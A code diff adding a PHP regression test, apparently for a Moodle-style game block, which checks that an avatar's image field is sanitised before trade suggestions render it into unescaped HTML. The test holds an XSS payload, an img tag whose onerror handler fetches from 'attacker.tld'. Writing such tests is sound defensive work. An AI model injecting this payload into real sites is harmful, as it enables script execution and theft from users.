@@ -1042,6 +1042,30 @@ final class game_test extends advanced_testcase {
     }
 
     /**
+     * Regression test for the security-audit finding: an avatar's raw image field must never
+     * reach the trade-suggestion array unsanitised, since suggest_trades_form.php interpolates
+     * reward_emoji into unescaped HTML.
+     */
+    public function test_build_trade_suggestions_strips_tags_from_avatar_image(): void {
+        $this->resetAfterTest(true);
+        $this->setup_block_instance();
+
+        $this->create_power_item('PlayerCoin', 'playercoin', '🪙');
+        $payload = '<img src=x onerror="fetch(\'https://attacker.tld/c\')">';
+        $avatar = $this->create_power_item('Evil Avatar', 'avatar_profile', $payload);
+
+        $suggestions = game::build_trade_suggestions($this->instanceid);
+
+        $byuid = [];
+        foreach ($suggestions as $sug) {
+            $byuid[$sug['uid']] = $sug;
+        }
+
+        $this->assertStringNotContainsString('<img', $byuid['ind_' . $avatar->id]['reward_emoji']);
+        $this->assertStringNotContainsString('onerror', $byuid['ind_' . $avatar->id]['reward_emoji']);
+    }
+
+    /**
      * build_trade_suggestions skips an avatar that is already the sole reward of a trade.
      */
     public function test_build_trade_suggestions_skips_covered_avatar(): void {
